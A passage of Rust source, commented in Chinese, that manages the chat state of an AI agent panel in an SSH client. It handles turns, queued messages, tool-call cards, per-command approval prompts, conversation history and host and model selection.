        self.active = Some(self.messages.len() - 1);
        self.script = None;
        self.pending = None;
        self.approvals.clear();
        self.real_running = true;
        self.retry = None;
        self.turn_started = Some(Instant::now());
        self.last_item = Some(LastKind::User);
        // 新回合开始：之前因为「停止」扣住的队列，从这一回合结束时起重新按「回合结束后发出」算。
        self.queue.release();
        true
    }

    /// 回合进行中用户补充一条消息：放进待发送队列。回合没在跑（或是离线演示脚本）时返回 `None`，
    /// 调用方直接发。
    fn enqueue(&mut self, text: &str) -> Option<u64> {
        if !self.real_running {
            return None;
        }
        self.queue.push(text)
    }

    /// 用户点「停止」：停掉回合；队列里还有话就扣住，不自动发，留给用户决定。
    fn stop_by_user(&mut self) -> bool {
        let had_turn = self.stop();
        if had_turn && !self.queue.is_empty() {
            self.queue.hold();
        }
        had_turn
    }

    /// 现在能不能「打断并发送」：有真实回合在跑、队列里有话。
    fn queue_can_interrupt(&self) -> bool {
        self.real_running && !self.queue.is_empty()
    }

    /// 「打断并发送」的状态部分：停掉回合，放开扣住，并开始等旧回合的收尾事件。
    /// 没有真实回合在跑返回 false（什么也没动）。
    fn interrupt_for_queue(&mut self, now: Instant) -> bool {
        if !self.real_running || self.queue.is_empty() {
            return false;
        }
        if !self.stop() {
            return false;
        }
        self.queue.release();
        self.queue.start_wind_down(now);
        true
    }

    /// 队列现在该不该自动发；该发就取出合并后的那一条。
    fn take_queue_to_send(&mut self, now: Instant) -> Option<String> {
        if !self.queue.ready_to_flush(self.is_running(), now) {
            return None;
        }
        self.queue.take_merged()
    }

    /// 启动失败（会话还没起来）：撤掉刚追加的用户消息和空的助手消息，回合当作没发生过。
    ///
    /// 只撤"刚好是这一轮追加、什么都没收到"的那一对；已经有内容的助手消息不动。
    fn discard_unstarted_turn(&mut self) {
        let blank = matches!(
            self.messages.last(),
            Some(ChatMessage::Assistant(message))
                if message.text.is_empty()
                    && message.reasoning.is_empty()
                    && message.tools.is_empty()
                    && message.notices.is_empty()
        );
        if blank {
            self.messages.pop();
            if matches!(self.messages.last(), Some(ChatMessage::User(_))) {
                self.messages.pop();
            }
        }
        self.finish_real_turn();
    }

    /// 把宿主事件写进对话。正文和工具只落在还在跑的回合里；提示总是可见。
    fn apply_agent_event(&mut self, event: AgentEvent) {
        // 重试成功（又出字 / 出思考 / 跑工具）或这一轮结束 / 出错：重试提示消失。
        if !matches!(event, AgentEvent::Retrying { .. }) {
            self.retry = None;
        }
        match event {
            AgentEvent::TextDelta { text } => {
                if self.real_running
                    && let Some(message) = self.active_assistant_mut()
                {
                    // 宿主给的是流式片段，直接拼起来，不能像脚本那样每段换行。
                    message.text.push_str(&text);
                    self.last_item = Some(LastKind::Text);
                }
            }
            AgentEvent::ReasoningDelta { text } => {
                if self.real_running
                    && let Some(message) = self.active_assistant_mut()
                {
                    message.reasoning.push_str(&text);
                    self.last_item = Some(LastKind::Text);
                }
            }
            AgentEvent::ToolStart {
                call_id,
                tool,
                input,
            } => {
                if !self.real_running {
                    return;
                }
                let shown = redact_tool_input(&input);
                let summary = format!("参数：{}", content_preview(&shown.to_string()));
                let tracked = agent_tools::track_call(&call_id, &tool, &input);
                if let Some(message) = self.ensure_assistant() {
                    message.tools.push(ToolCard::new(
                        call_id,
                        tool,
                        ToolInput::Real { summary, input },
                    ));
                }
                self.last_item = Some(LastKind::Tool);
                if let Some(tracked) = tracked {
                    self.tracked.push(tracked);
                    self.claim_stashed_reports();
                }
            }
            AgentEvent::ToolEnd {
                call_id,
                tool,
                output,
                error,
            } => {
                if self.card_mut(&call_id).is_none() {
                    // 没收到 ToolStart（重连 / 事件丢失）：补一张卡片，别把结果吞掉。
                    if self.real_running
                        && let Some(message) = self.ensure_assistant()
                    {
                        message.tools.push(ToolCard::new(
                            call_id.clone(),
                            tool,
                            ToolInput::Real {
                                summary: String::new(),
                                input: Value::Null,
                            },
                        ));
                    }
                }
                // 结果末尾带着后端给这次调用的执行编号：拿它按编号精确校正卡片和回报的配对，
                // 卡片上不显示这一行。
                let (output, result_exec_id) = agent_tools::split_exec_marker(&output);
                if let Some(call) = self.tracked.iter_mut().find(|call| call.call_id == call_id) {
                    call.ended = true;
                }
                if let Some(card) = self.card_mut(&call_id) {
                    if error {
                        card.output = None;
                        card.error = Some(output);
                        card.status = ToolStatus::Failed;
                    } else {
                        card.output = Some(output);
                        card.error = None;
                        card.status = ToolStatus::Done;
                        card.output_expanded = true;
                    }
                }
                if let Some(exec_id) = result_exec_id {
                    let changes = agent_tools::apply_result_exec_id(
                        &mut self.tracked,
                        &self.reports,
                        &call_id,
                        &exec_id,
                    );
                    self.apply_exec_changes(changes);
                }
            }
            AgentEvent::TurnEnd => {
                // 旧回合的收尾事件到了：「打断并发送」可以发新回合了（它之前的事件都已经处理完）。
                self.queue.finish_wind_down();
                self.finish_real_turn();
            }
            AgentEvent::Error { message } => {
                self.push_notice(format!("错误：{message}"), true);
            }
            AgentEvent::Retrying {
                attempt,
                reason,
                next_in_secs,
            } => {
                // 0.2.14：重试提示放在「思考中」旁边，不往消息里堆一条条提示。
                self.retry = Some(RetryNotice {
                    attempt,
                    reason,
                    next_in_secs,
                });
            }
            AgentEvent::ResumeFailed => self.push_notice(
                "续接之前的会话失败，已经改成新会话继续：之前的上下文没有带给 AI。",
                false,
            ),
        }
    }

    /// 执行层回报了一次工具调用的实际执行位置：配到对应的卡片上；卡片还没出现就先存着。
    /// `multi`：卡片上要标出主机名（对话里有多个目标，或者当时没有「当前」）。
    fn apply_report(&mut self, report: ExecTargetReport, multi: bool) {
        if multi {
            self.report_multi.insert(report.exec_id.clone());
        }
        let arrived = agent_tools::report_arrived(&mut self.tracked, &self.reports, &report);
        self.reports.insert(report.exec_id.clone(), report.clone());
        match arrived {
            Some(changes) => self.apply_exec_changes(changes),
            None => self.unclaimed.push(report),
        }
    }

    /// 新卡片出现了：先到的回报里有没有它的。
    fn claim_stashed_reports(&mut self) {
        let stashed = std::mem::take(&mut self.unclaimed);
        for report in stashed {
            match agent_tools::report_arrived(&mut self.tracked, &self.reports, &report) {
                Some(changes) => self.apply_exec_changes(changes),
                None => self.unclaimed.push(report),
            }
        }
    }

    fn apply_exec_changes(&mut self, changes: Vec<agent_tools::ExecChange>) {
        for change in changes {
            let multi = change
                .report
                .as_ref()
                .is_some_and(|report| self.report_multi.contains(&report.exec_id));
            if let Some(card) = self.card_mut(&change.call_id) {
                card.exec = change.report.as_ref().map(ExecInfo::from);
                card.exec_multi = multi;
            }
        }
    }

    /// 这张卡片的调用是不是带目标的、已经结束、执行层却一直没回报（目标没能解析出来）。
    fn target_unknown(&self, card: &ToolCard) -> bool {
        card.exec.is_none()
            && !card.is_approval()
            && !matches!(
                card.status,
                ToolStatus::Running | ToolStatus::AwaitingApproval
            )
            && self.tracked.iter().any(|call| call.call_id == card.call_id)
    }

    /// 「思考中」要不要显示（回合在跑，且这会儿既没有文字在出、也没有命令在跑、也没有等批准的）。
    fn thinking_visible(&self) -> bool {
        let last = match self.last_item {
            None => LastItem::None,
            Some(LastKind::User) => LastItem::User,
            Some(LastKind::Text) => LastItem::Text,
            Some(LastKind::Tool) => {
                let any_running = match self.messages.last() {
                    Some(ChatMessage::Assistant(message)) => message
                        .tools
                        .iter()
                        .any(|card| card.status == ToolStatus::Running),
                    _ => false,
                };
                LastItem::Tool { any_running }
            }
        };
        agent_tools::show_thinking(self.real_running, last, !self.approvals.is_empty())
    }

    /// 真实模式的确认请求：挂一张「等待确认」卡片，等用户回答。
    fn approval_prompt(&mut self, id: u64, request: &ApprovalRequest) -> bool {
        if self.approvals.iter().any(|approval| approval.id == id) {
            return false;
        }
        let call_id = format!("approval-{id}");
        let (tool, input) = approval_input(request);
        if let Some(message) = self.ensure_assistant() {
            let mut card = ToolCard::new(call_id.clone(), tool, input);
            card.approval = ApprovalState::Pending;
            card.status = ToolStatus::AwaitingApproval;
            card.detail = Some(ApprovalDetail::new(request.clone()));
            // 审批请求自带执行位置（和执行层回报是同一份解析结果）：卡片上马上能标出哪台主机、哪个终端。
            if !request.target_id.is_empty() {
                card.exec = Some(ExecInfo {
                    exec_id: request.exec_id.clone(),
                    target_id: request.target_id.clone(),
                    session_id: request.session_id.clone(),
                    label: request.host_label.clone(),
                });
                card.exec_multi = true;
            }
            message.tools.push(card);
        }
        self.approvals.push(RealApproval { id, call_id });
        self.last_item = Some(LastKind::Tool);
        true
    }

    /// 等待期间失效的确认（超时、停止、目标被取消选择）：卡片标成失败，不再给按钮。
    /// `is_live` 问宿主这个请求还有没有人在等；返回是否有卡片变了。
    fn expire_dead_approvals(&mut self, is_live: impl Fn(u64) -> bool) -> bool {
        let dead: Vec<RealApproval> = self
            .approvals
            .iter()
            .filter(|approval| !is_live(approval.id))
            .cloned()
            .collect();
        if dead.is_empty() {
            return false;
        }
        self.approvals
            .retain(|approval| dead.iter().all(|gone| gone.id != approval.id));
        for approval in dead {
            if let Some(card) = self.card_mut(&approval.call_id) {
                card.approval = ApprovalState::Denied;
                card.status = ToolStatus::Failed;
                card.error = Some(APPROVAL_GONE.to_owned());
            }
        }
        true
    }

    /// 这条确认是不是真实模式弹出来的；界面据此决定回填到宿主还是演示脚本。
    fn real_approval(&self, call_id: &str) -> Option<u64> {
        self.approvals
            .iter()
            .find(|approval| approval.call_id == call_id)
            .map(|approval| approval.id)
    }

    /// 用户回答了一条真实确认；`live` 是宿主是否还认这个请求。
    fn resolve_real_approval(&mut self, call_id: &str, allow: bool, live: bool) -> bool {
        let Some(index) = self
            .approvals
            .iter()
            .position(|approval| approval.call_id == call_id)
        else {
            return false;
        };
        self.approvals.remove(index);
        let Some(card) = self.card_mut(call_id) else {
            return true;
        };
        if !live {
            // 请求已经超时 / 被销毁：卡片不能停在「等待确认」，也不能显示成完成。
            card.approval = ApprovalState::Denied;
            card.status = ToolStatus::Failed;
            card.error = Some(APPROVAL_EXPIRED.to_owned());
        } else if allow {
            card.approval = ApprovalState::Allowed;
            // 确认卡片的职责到此为止；命令本身的结果在驱动的工具卡片上。
            card.status = ToolStatus::Answered;
        } else {
            card.approval = ApprovalState::Denied;
            card.status = ToolStatus::Failed;
            card.error = Some(DENIED_ERROR.to_owned());
        }
        true
    }

    /// 回合结束：停掉运行状态；还没回答的确认标成未确认，不能看起来像完成。
    fn finish_real_turn(&mut self) {
        self.real_running = false;
        self.retry = None;
        self.turn_started = None;
        // 这一回合里始终没等到卡片的回报：作废，别让它去认领下一回合里同名的调用。
        self.unclaimed.clear();
        let approvals = std::mem::take(&mut self.approvals);
        if let Some(message) = self.active_assistant_mut() {
            for card in &mut message.tools {
                if approvals
                    .iter()
                    .any(|approval| approval.call_id == card.call_id)
                {
                    card.approval = ApprovalState::Denied;
                    card.status = ToolStatus::Failed;
                    card.error = Some(APPROVAL_EXPIRED.to_owned());
                } else if matches!(
                    card.status,
                    ToolStatus::Running | ToolStatus::AwaitingApproval
                ) {
                    // 工具没等到结果回合就结束了：不能一直显示「运行中」。
                    card.status = ToolStatus::Stopped;
                    if card.error.is_none() {
                        card.error = Some(TURN_ENDED.to_owned());
                    }
                }
            }
        }
        self.active = None;
        self.pending = None;
    }

    /// 停止当前回合：脚本立即作废，助手消息标记已停止，待确认按拒绝处理。
    fn stop(&mut self) -> bool {
        if self.script.is_none() && !self.real_running {
            return false;
        }
        self.script = None;
        self.real_running = false;
        self.retry = None;
        self.turn_started = None;
        let pending = self.pending.take();
        let approvals = std::mem::take(&mut self.approvals);
        if let Some(message) = self.active_assistant_mut() {
            message.stopped = true;
            let mut denied: Vec<&str> = approvals
                .iter()
                .map(|approval| approval.call_id.as_str())
                .collect();
            if let Some(pending) = &pending {
                denied.push(pending.call_id.as_str());
            }
            for card in &mut message.tools {
                if denied.contains(&card.call_id.as_str()) {
                    card.approval = ApprovalState::Denied;
                    card.status = ToolStatus::Stopped;
                    card.error = Some(STOPPED_ERROR.to_owned());
                } else if matches!(
                    card.status,
                    ToolStatus::Running | ToolStatus::AwaitingApproval
                ) {
                    card.status = ToolStatus::Stopped;
                    if card.error.is_none() {
                        card.error = Some(STOPPED_ERROR.to_owned());
                    }
                }
            }
        }
        self.active = None;
        true
    }

    /// 新对话：清空消息，脚本、真实回合和待确认一起丢掉。
    fn new_conversation(&mut self) {
        self.messages.clear();
        self.active = None;
        self.script = None;
        self.pending = None;
        self.real_running = false;
        self.approvals.clear();
        self.tracked.clear();
        self.reports.clear();
        self.unclaimed.clear();
        self.report_multi.clear();
        self.retry = None;
        self.turn_started = None;
        self.last_item = None;
        self.queue.clear();
    }

    fn toggle_reasoning(&mut self, index: usize) -> bool {
        if let Some(ChatMessage::Assistant(message)) = self.messages.get_mut(index) {
            message.reasoning_expanded = !message.reasoning_expanded;
            true
        } else {
            false
        }
    }

    /// 「原文 / 渲染」：只切换正文的显示方式，不动正文、工具卡片和历史。
    fn toggle_raw(&mut self, index: usize) -> bool {
        if let Some(ChatMessage::Assistant(message)) = self.messages.get_mut(index) {
            message.show_raw = !message.show_raw;
            true
        } else {
            false
        }
    }

    fn toggle_tool_output(&mut self, message_index: usize, tool_index: usize) -> bool {
        if let Some(ChatMessage::Assistant(message)) = self.messages.get_mut(message_index)
            && let Some(card) = message.tools.get_mut(tool_index)
        {
            card.output_expanded = !card.output_expanded;
            true
        } else {
            false
        }
    }

    /// 按下标取一张卡片（界面按钮用）。
    fn card_at(&mut self, message_index: usize, tool_index: usize) -> Option<&mut ToolCard> {
        match self.messages.get_mut(message_index)? {
            ChatMessage::Assistant(message) => message.tools.get_mut(tool_index),
            ChatMessage::User(_) => None,
        }
    }

    /// 确认卡片 / 命令框的「展开全文」。
    fn toggle_command_expanded(&mut self, message_index: usize, tool_index: usize) -> bool {
        let Some(card) = self.card_at(message_index, tool_index) else {
            return false;
        };
        match card.detail.as_mut() {
            Some(detail) => detail.command_expanded = !detail.command_expanded,
            None => card.command_expanded = !card.command_expanded,
        }
        true
    }

    /// 文件差异的「展开 / 收起」。
    fn toggle_diff_expanded(&mut self, message_index: usize, tool_index: usize) -> bool {
        match self
            .card_at(message_index, tool_index)
            .and_then(|card| card.detail.as_mut())
        {
            Some(detail) => {
                detail.diff_expanded = !detail.diff_expanded;
                true
            }
            None => false,
        }
    }

    /// 工具输出的「显示全部 / 收起」。
    fn toggle_output_full(&mut self, message_index: usize, tool_index: usize) -> bool {
        match self.card_at(message_index, tool_index) {
            Some(card) => {
                card.output_full = !card.output_full;
                true
            }
            None => false,
        }
    }

    /// 一组已经执行完的工具调用的「展开 / 收起」（键 = 这一组第一张卡片的下标）。
    fn toggle_group(&mut self, message_index: usize, first: usize) -> bool {
        if let Some(ChatMessage::Assistant(message)) = self.messages.get_mut(message_index) {
            if !message.open_groups.remove(&first) {
                message.open_groups.insert(first);
            }
            true
        } else {
            false
        }
    }

    /// 超长助手正文的「展开全文 / 收起」。
    fn toggle_body_expanded(&mut self, index: usize) -> bool {
        if let Some(ChatMessage::Assistant(message)) = self.messages.get_mut(index) {
            message.body_expanded = !message.body_expanded;
            true
        } else {
            false
        }
    }

    /// 把历史会话的消息放回对话区（继续历史会话时用），先清空当前对话。
    ///
    /// 工具消息挂在它前面最近的一条助手消息下面（历史里助手正文和工具是平铺的）。
    /// 回合状态不恢复：这些只是回看用的内容，新一轮从下一次发送开始。
    fn load_history(&mut self, messages: &[HistoryMessage]) {
        self.new_conversation();
        for message in messages {
            match message {
                HistoryMessage::User { text } => {
                    self.messages.push(ChatMessage::User(text.clone()));
                }
                HistoryMessage::Assistant { text } => {
                    self.messages.push(ChatMessage::Assistant(AssistantMessage {
                        text: text.clone(),
                        ..AssistantMessage::default()
                    }));
                }
                HistoryMessage::Tool {
                    tool,
                    input,
                    output,
                    status,
                } => {
                    if !matches!(self.messages.last(), Some(ChatMessage::Assistant(_))) {
                        self.messages
                            .push(ChatMessage::Assistant(AssistantMessage::default()));
                    }
                    if let Some(ChatMessage::Assistant(last)) = self.messages.last_mut() {
                        last.tools
                            .push(history_tool_card(tool, input, output, status));
                    }
                }
            }
        }
    }

    fn active_assistant_mut(&mut self) -> Option<&mut AssistantMessage> {
        let index = self.active?;
        match self.messages.get_mut(index)? {
            ChatMessage::Assistant(message) => Some(message),
            ChatMessage::User(_) => None,
        }
    }

    /// 取当前回合的助手消息；回合已经收尾时另起一条（真实事件可能晚到）。
    fn ensure_assistant(&mut self) -> Option<&mut AssistantMessage> {
        if self.active.is_none() {
            self.messages
                .push(ChatMessage::Assistant(AssistantMessage::default()));
            self.active = Some(self.messages.len() - 1);
        }
        self.active_assistant_mut()
    }

    /// 按 `call_id` 找工具卡片；真实事件可能落在已经收尾的消息上。
    fn card_mut(&mut self, call_id: &str) -> Option<&mut ToolCard> {
        self.messages
            .iter_mut()
            .rev()
            .find_map(|message| match message {
                ChatMessage::Assistant(message) => message
                    .tools
                    .iter_mut()
                    .rev()
                    .find(|card| card.call_id == call_id),
                ChatMessage::User(_) => None,
            })
    }

    fn push_notice(&mut self, text: impl Into<String>, error: bool) {
        if let Some(message) = self.ensure_assistant() {
            message.notices.push(Notice {
                text: text.into(),
                error,
            });
        }
    }

    /// 把对话映射成历史草稿：用户消息、助手正文、工具卡片按顺序。
    ///
    /// 只存对话本身：提示（重试 / 错误）和思考是界面状态，不进历史。助手正文为空
    /// （只有工具调用）时不写一条空消息。
    fn history_draft(
        &self,
        id: &str,
        host_label: Option<&str>,
        anchor: Option<HistoryAnchor>,
    ) -> HistoryDraft {
        let mut messages = Vec::new();
        for message in &self.messages {
            match message {
                ChatMessage::User(text) => {
                    messages.push(HistoryMessage::User { text: text.clone() })
                }
                ChatMessage::Assistant(message) => {
                    if !message.text.trim().is_empty() {
                        messages.push(HistoryMessage::Assistant {
                            text: message.text.clone(),
                        });
                    }
                    for card in &message.tools {
                        messages.push(HistoryMessage::Tool {
                            tool: card.tool.clone(),
                            input: card.input.json(),
                            output: tool_output_text(card),
                            status: tool_history_status(card.status, card.approval).to_owned(),
                        });
                    }
                }
            }
        }
        HistoryDraft {
            id: id.to_owned(),
            host_label: host_label.map(str::to_owned),
            anchor,
            messages,
        }
    }
}

/// 工具卡片 → 历史里的状态（和 [`history_tool_status`] 的显示一一对应）。
///
/// 被拒绝 / 未确认的卡片在界面上都是 `Failed`，靠确认状态区分成 `rejected`。
fn tool_history_status(status: ToolStatus, approval: ApprovalState) -> &'static str {
    match status {
        ToolStatus::Done | ToolStatus::Answered => "done",
        ToolStatus::Stopped => "stopped",
        ToolStatus::Failed if approval == ApprovalState::Denied => "rejected",
        ToolStatus::Failed => "error",
        ToolStatus::Running | ToolStatus::AwaitingApproval => "running",
    }
}

/// 工具卡片的结果：有输出写输出，只有错误写错误，两个都有就都留下。
fn tool_output_text(card: &ToolCard) -> String {
    match (&card.output, &card.error) {
        (Some(output), Some(error)) => format!("{output}\n错误：{error}"),
        (Some(output), None) => output.clone(),
        (None, Some(error)) => error.clone(),
        (None, None) => String::new(),
    }
}

/// 历史里的一条工具消息 → 回看用的卡片：没有按钮，不会显示成"运行中"。
fn history_tool_card(tool: &str, input: &Value, output: &str, status: &str) -> ToolCard {
    let shown = redact_tool_input(input);
    let summary = if shown.is_null() {
        String::new()
    } else {
        format!("参数：{}", content_preview(&shown.to_string()))
    };
    let mut card = ToolCard::new(
        "history".to_owned(),
        tool.to_owned(),
        ToolInput::Real {
            summary,
            input: input.clone(),
        },
    );
    card.output_expanded = false;
    let text = (!output.trim().is_empty()).then(|| output.to_owned());
    match status {
        "done" => {
            card.status = ToolStatus::Done;
            card.output = text;
        }
        "error" => {
            card.status = ToolStatus::Failed;
            card.error = Some(text.unwrap_or_else(|| "失败".to_owned()));
        }
        "rejected" => {
            card.status = ToolStatus::Failed;
            card.approval = ApprovalState::Denied;
            card.error = Some(text.unwrap_or_else(|| DENIED_ERROR.to_owned()));
        }
        "stopped" => {
            card.status = ToolStatus::Stopped;
            card.error = Some(text.unwrap_or_else(|| STOPPED_ERROR.to_owned()));
        }
        // 存的时候还在跑（异常退出 / 旧文件）：回看时不能一直显示"运行中"。
        _ => {
            card.status = ToolStatus::Stopped;
            card.error = Some(text.unwrap_or_else(|| TURN_ENDED.to_owned()));
        }
    }
    card
}

/// 两段增量之间换行，避免中文句子粘在一起；仍然只在同一条消息里累积。
fn push_paragraph(target: &mut String, delta: &str) {
    if !target.is_empty() {
        target.push('\n');
    }
    target.push_str(delta);
}

/// 点链接之后底部的提示。所有链接 handler 都过 [`link_action`]（core 的 `validate_external_url`）：
/// 和 0.2.14 一致，**不打开浏览器，只复制网址**，并把完整网址显示出来让用户自己看清。
fn link_click_notice(raw: &str) -> (Notice, Option<String>) {
    match link_action(raw) {
        LinkAction::Copy(url) => (
            Notice {
                text: format!("已复制链接：{url}"),
                error: false,
            },
            Some(url),
        ),
        LinkAction::Refuse(reason) => (
            Notice {
                text: format!("链接没有复制：{reason}"),
                error: true,
            },
            None,
        ),
    }
}

/// 只有左键/中键（以及键盘触发）才打开链接；右键和长按不打开，和 TextView 默认行为一致。
fn link_click_opens(event: &ClickEvent) -> bool {
    match event {
        ClickEvent::Mouse(click) => {
            matches!(click.up.button, MouseButton::Left | MouseButton::Middle)
        }
        ClickEvent::Keyboard(_) => true,
        ClickEvent::Touch(click) => !click.long_press,
    }
}

/// 代码块「复制」写进剪贴板的内容：行尾统一成 LF，去掉围栏自带的末尾换行。
fn code_block_copy_text(code: &str) -> String {
    let normalized = code.replace("\r\n", "\n").replace('\r', "\n");
    normalized.trim_end_matches('\n').to_owned()
}

/// 表格「复制表格」写进剪贴板的内容：制表符分列、换行分行，和表格软件粘贴的 TSV 一致。
fn table_tsv(headers: &[String], rows: &[Vec<String>]) -> String {
    let mut lines = Vec::with_capacity(rows.len() + usize::from(!headers.is_empty()));
    if !headers.is_empty() {
        lines.push(tsv_line(headers));
    }
    for row in rows {
        lines.push(tsv_line(row));
    }
    lines.join("\n")
}

/// 单元格里的制表符和换行会把 TSV 切错列/行，先换成空格。
fn tsv_line(cells: &[String]) -> String {
    cells
        .iter()
        .map(|cell| cell.replace(['\t', '\r', '\n'], " "))
        .collect::<Vec<_>>()
        .join("\t")
}

/// 窗口启动时选哪种模式：产品默认是真实智能体。`ZSSH_AGENT_DEMO=1` 钩子（只在调试版读得到）
/// 才从离线演示开始；发行版里钩子恒为 `None`，所以恒为真实模式。
fn start_in_real_mode(demo_hook: Option<&str>) -> bool {
    demo_hook != Some("1")
}

/// 离线演示的切换入口只在调试版出现。
fn demo_toggle_available() -> bool {
    crate::dev_hooks::ENABLED
}

/// 历史会话的存取：和 Tauri 版共用 `<数据目录>\ai-history`。
fn history_store() -> HistoryStore {
    HistoryStore::new(&crate::settings::data_dir())
}

/// 同一个进程里连开几个对话时，同一毫秒分到的序号也不一样。
static HISTORY_ID_COUNTER: AtomicU64 = AtomicU64::new(0);

/// 一个对话的历史 id：`ai-<毫秒>-<序号>`，只含字母、数字和 `-`，能直接当文件名。
fn new_history_id(now: u64, counter: u64) -> String {
    format!("ai-{now}-{counter}")
}

fn allocate_history_id() -> String {
    new_history_id(now_ms(), HISTORY_ID_COUNTER.fetch_add(1, Ordering::Relaxed))
}

/// 这个对话的历史 id：第一次真实发送时分配，之后的回合一直复用；「新对话」把它清掉，
/// 下一次发送再重新分配。
fn history_id_for_turn(slot: &mut Option<String>) -> String {
    slot.get_or_insert_with(allocate_history_id).clone()
}

/// 读某个智能体的历史列表（0.2.14：当前智能体的）。只扫本地目录（每种智能体最多 50 个文件），
/// 不碰网络。
fn load_history_rows(agent: AgentKind) -> Result<Vec<HistorySummary>, String> {
    history_store()
        .list(agent.id())
        .map_err(|err| err.to_string())
}

/// 读一条历史会话（回看 / 续接都要先读整条）。
fn load_history_record(agent: AgentKind, id: &str) -> Result<HistoryRecord, String> {
    history_store()
        .load(agent.id(), id)
        .map_err(|err| err.to_string())
}

/// 删一条历史会话（不存在也算成功）。
fn delete_history_record(agent: AgentKind, id: &str) -> Result<(), String> {
    history_store()
        .delete(agent.id(), id)
        .map_err(|err| err.to_string())
}

/// 「继续」要交给驱动的智能体会话 id；没有就只能回看。
fn resume_session_id(record: &HistoryRecord) -> Result<String, String> {
    match record.agent_session_id.as_deref().map(str::trim) {
        Some(id) if !id.is_empty() => Ok(id.to_owned()),
        _ => Err(HISTORY_NO_SESSION.to_owned()),
    }
}

/// 「继续」一条历史会话时对话的身份怎么换：当前对话整个换成那条历史的消息，历史 id
/// 换成它的（之后的回合写回它自己的文件，不会写进别的对话），并记下要 `--resume` 的
/// Claude 会话 id。调用方要先结束当前真实会话。
fn continue_conversation(
    chat: &mut ChatState,
    history_id: &mut Option<String>,
    pending_resume: &mut Option<String>,
    record: &HistoryRecord,
) -> Result<(), String> {
    let resume = resume_session_id(record)?;
    chat.load_history(&record.messages);
    *history_id = Some(record.id.clone());
    *pending_resume = Some(resume);
    Ok(())
}

/// 历史列表里的更新时间：最近用相对时间，久了写日期（UTC，不引时间库）。
fn format_history_time(updated_at: u64, now: u64) -> String {
    let seconds = now.saturating_sub(updated_at) / 1000;
    match seconds {
        0..=59 => "刚刚".to_owned(),
        60..=3_599 => format!("{} 分钟前", seconds / 60),
        3_600..=86_399 => format!("{} 小时前", seconds / 3_600),
        86_400..=2_591_999 => format!("{} 天前", seconds / 86_400),
        _ => format!(
            "{} UTC",
            zssh_core::ai::files::display_timestamp((updated_at / 1000) as i64)
        ),
    }
}

/// 历史里显示的主机名：优先对话锚定的那台（V2-U15），旧历史没有锚定就用当时存的主机显示名。
fn history_host(anchor: Option<&HistoryAnchor>, host_label: Option<&str>) -> Option<String> {
    anchor
        .map(|anchor| anchor.name.clone())
        .or_else(|| host_label.map(str::to_owned))
}

/// 一行历史摘要：更新时间 · 主机显示名 · 消息数。
fn history_meta(
    updated_at: u64,
    host_label: Option<&str>,
    message_count: usize,
    now: u64,
) -> String {
    let mut parts = vec![format_history_time(updated_at, now)];
    if let Some(host) = host_label.map(str::trim).filter(|host| !host.is_empty()) {
        parts.push(host.to_owned());
    }
    parts.push(format!("{message_count} 条消息"));
    parts.join(" · ")
}

/// 列表 / 查看页的标题；历史文件里的标题可能是空的（旧文件 / 手改）。
fn history_title(title: &str) -> &str {
    let title = title.trim();
    if title.is_empty() {
        "（无标题）"
    } else {
        title
    }
}

/// 历史里的工具状态（文件里存的是英文状态）。
fn history_tool_status(status: &str) -> String {
    match status {
        "done" => "完成".to_owned(),
        "error" => "失败".to_owned(),
        "rejected" => "已拒绝".to_owned(),
        "stopped" => "已停止".to_owned(),
        "running" => "运行中".to_owned(),
        "" => "未知".to_owned(),
        other => other.to_owned(),
    }
}

/// 「目标主机」里的一台主机；只留执行需要的字段。
mod agent_ui;
mod composer;
mod embed;
mod queue;
mod queue_view;
pub use embed::EmbedContext;

type HostChoice = HostTarget;

const INPUT_PLACEHOLDER: &str = "输入消息；Enter 发送，Shift+Enter 换行";
const INPUT_PLACEHOLDER_RUNNING: &str = "AI 正在回答：Enter 把消息加入待发送队列";

/// 点一台主机：选中就取消，没选中就加上。默认一台都不选（和 0.2.14 一致：没有 @ 选过的
/// 主机就没有目标）。返回点完之后这台主机是不是选中。
fn toggle_host_selection(selected: &mut Vec<i64>, id: i64) -> bool {
    if let Some(position) = selected.iter().position(|chosen| *chosen == id) {
        selected.remove(position);
        false
    } else {
        selected.push(id);
        true
    }
}

/// 选中的主机（按主机库里的顺序）；主机库里已经没有的 id 直接忽略。
fn selected_targets(hosts: &[HostChoice], selected: &[i64]) -> Vec<HostTarget> {
    hosts
        .iter()
        .filter(|host| selected.contains(&host.id))
        .cloned()
        .collect()
}

/// 存进历史的主机显示名：选了几台就写几台，没选就不写。
fn host_names_label(targets: &[HostTarget]) -> Option<String> {
    if targets.is_empty() {
        None
    } else {
        Some(
            targets
                .iter()
                .map(|host| host.name.as_str())
                .collect::<Vec<_>>()
                .join("、"),
        )
    }
}

/// 模型循环里的一项；`id` 为 `None` 表示智能体默认模型。
#[derive(Clone, Debug, PartialEq, Eq)]
struct ModelChoice {
    id: Option<String>,
    label: String,
}

impl Default for ModelChoice {
    fn default() -> Self {
        Self {
            id: None,
            label: DEFAULT_MODEL.to_owned(),
        }
    }
}

/// 「默认」+ 智能体目录里的模型。
fn model_choices(catalog: &AgentModelCatalog) -> Vec<ModelChoice> {
    let mut models = vec![ModelChoice::default()];
    models.extend(catalog.models.iter().map(|model| ModelChoice {
        id: Some(model.id.clone()),
        label: model.name.clone(),
    }));
    models
}

/// 「模型」按钮上的文字。
fn model_label(models: &[ModelChoice], index: usize) -> String {
    let name = models
        .get(index)
        .map(|model| model.label.as_str())
        .unwrap_or(DEFAULT_MODEL);
    format!("模型：{name}")
}

/// 模型循环的下一个下标；只有「默认」一项时不动。
fn next_model_index(count: usize, index: usize) -> usize {
    if count <= 1 { 0 } else { (index + 1) % count }
}

/// 审批请求 → 工具卡片：`run_command` 的卡片带命令全文，`write_file` 带路径和差异
/// （全文在 [`ApprovalDetail`] 里，这里只放标题行的一行摘要）。
fn approval_input(request: &ApprovalRequest) -> (String, ToolInput) {
    let tool = if request.file.is_some() {
        "write_file"
    } else {
        "run_command"
    };
    let summary = match &request.file {
        Some(file) => format!("路径：{}", redact_paths(&file.path)),
        None => format!("$ {}", one_line_summary(&request.command, PREVIEW_LIMIT)),
    };
    // 确认卡片本身也是一张工具卡片；存历史时把命令和主机带上（凭据类字段由 core 抹掉）。
    let input = match &request.file {
        Some(file) => json!({
            "host": &request.host_label,
            "command": &request.command,
            "path": &file.path,
            "is_new": file.is_new,
        }),
        None => json!({
            "host": &request.host_label,
            "command": &request.command,
        }),
    };
    (tool.to_owned(), ToolInput::Real { summary, input })
}

/// 读执行模式；失败时按逐条确认显示，原因交给底部。
fn load_exec_mode(db: &Database) -> (ExecMode, Option<String>) {
    match db.ai_exec_mode() {
